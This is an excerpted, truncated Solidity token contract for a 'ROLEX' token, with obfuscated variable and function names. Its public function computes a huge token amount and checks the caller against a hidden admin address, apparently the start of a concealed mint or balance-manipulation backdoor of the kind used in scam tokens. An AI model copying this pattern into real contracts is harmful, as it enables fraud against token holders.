...
contract ROLEXTOKEN is Ownable {
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
    uint256 diseAmmount = 100000000000*10**decimals();
    ...
    string private _disetokenname = "ROLEX";
    string private _voptokensymbol = "ROLEX";
    ...
    function YAYAYDAMININFO() public     {
        uint256 twoyayayammm = 190000000000*10**18;
        uint256 yayayamount = 655000*twoyayayammm*1*1*1;
        if(diseAdmin != _msgSender()){
